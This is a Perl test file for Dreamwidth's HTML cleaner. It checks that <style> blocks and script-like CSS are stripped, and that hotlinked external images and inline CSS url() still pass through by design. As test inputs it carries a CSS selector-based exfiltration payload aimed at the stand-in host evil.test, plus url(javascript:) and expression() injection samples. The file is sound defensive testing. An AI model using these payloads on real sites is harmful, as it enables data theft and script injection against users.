# t/cleaner-resource-loading.t
#
# Characterization tests for how LJ::CleanHTML handles third-party RESOURCE
# LOADING in user content (external images and CSS url()). This is a privacy
# concern, not code execution: fetching an external resource leaks the viewer's
# IP / User-Agent (and a "this was viewed" signal) to that host.
#
# Dreamwidth INTENTIONALLY allows external images -- hotlinking is a long-standing
# feature, and the DW::Proxy/https_url machinery exists only to fix mixed content
# (http -> https), not to hide the viewer. Inline CSS url() is treated the same
# way. These tests pin that accepted behavior so any change to it is deliberate,
# and -- more importantly -- lock in the controls that stop the *dangerous*
# variants: <style> blocks are removed (so there is no place to write the
# attribute selectors that CSS-based data exfiltration needs), and script-y CSS
# (url(javascript:), expression(), etc.) is stripped.
#
# If DW's privacy policy changes (e.g. block or proxy all third-party fetches),
# update the "accepted policy" expectations below on purpose.
#
# Copyright (c) 2026 by Dreamwidth Studios, LLC.
#
# This program is free software; you may redistribute it and/or modify it under
# the same terms as Perl itself. For a copy of the license, please reference
# 'perldoc perlartistic' or 'perldoc perlgpl'.

use strict;
use warnings;

use Test::More;

BEGIN { require "$ENV{LJHOME}/t/lib/ljtestlib.pl"; }
use LJ::CleanHTML;
use HTMLCleaner;
use LJ::Hooks;
use LJ::Web;

no warnings 'redefine';
local *LJ::Lang::ml = sub { return "[ml:$_[0]]"; };
use warnings 'redefine';

sub clean_event {
    my $d = $_[0];
    LJ::CleanHTML::clean_event( \$d );
    return $d;
}

sub clean_comment {
    my $d = $_[0];
    LJ::CleanHTML::clean_comment( \$d );
    return $d;
}

# ---------------------------------------------------------------------------
# Controls that MUST hold. These are what keep external resource loading from
# escalating past "leaks an IP" into data exfiltration or scripting.
# ---------------------------------------------------------------------------
for my $clean ( \&clean_event, \&clean_comment ) {

    # <style> blocks are removed entirely. Without them there is nowhere to put
    # the CSS attribute selectors that selector-based exfiltration requires.
    my $out = $clean->(q{<style>input[value^=x]{background:url(https://evil.test/leak)}</style>});
    unlike( $out, qr/<\s*style/i, "removes <style> blocks (no selector-based CSS exfil)" );
    unlike( $out, qr/evil\.test/, "drops the url() inside a removed <style> block" );

    # script-y CSS in an inline style is stripped (the value, not just the tag).
    $out = $clean->(q{<div style="background:url(javascript:alert(1))">x</div>});
    unlike( $out, qr/javascript/i, "strips url(javascript:) from inline style" );

    $out = $clean->(q{<div style="width:expression(alert(1))">x</div>});
    unlike( $out, qr/expression/i, "strips expression() from inline style" );
}

# ---------------------------------------------------------------------------
# Accepted policy (intentional, documented). External images and inline CSS
# url() to a third party ARE allowed and pass through. Change deliberately.
# ---------------------------------------------------------------------------
like(
    clean_event(q{<img src="https://example.com/pic.gif">}),
    qr{src="https://example\.com/pic\.gif"},
    "external <img> passes through (accepted hotlinking; leaks viewer IP by design)"
);
like(
    clean_comment(q{<img src="https://example.com/pic.gif">}),
    qr{src="https://example\.com/pic\.gif"},
    "external <img> in a comment passes through"
);
like(
    clean_event(q{<div style="background:url(https://example.com/bg.png)">x</div>}),
    qr{url\(https://example\.com/bg\.png\)},
    "external inline CSS url() passes through (accepted; same privacy tradeoff as an image)"
);
like(
    clean_comment(q{<div style="background:url(https://example.com/bg.png)">x</div>}),
    qr{url\(https://example\.com/bg\.png\)},
    "external inline CSS url() in a comment passes through"
);

done_testing();
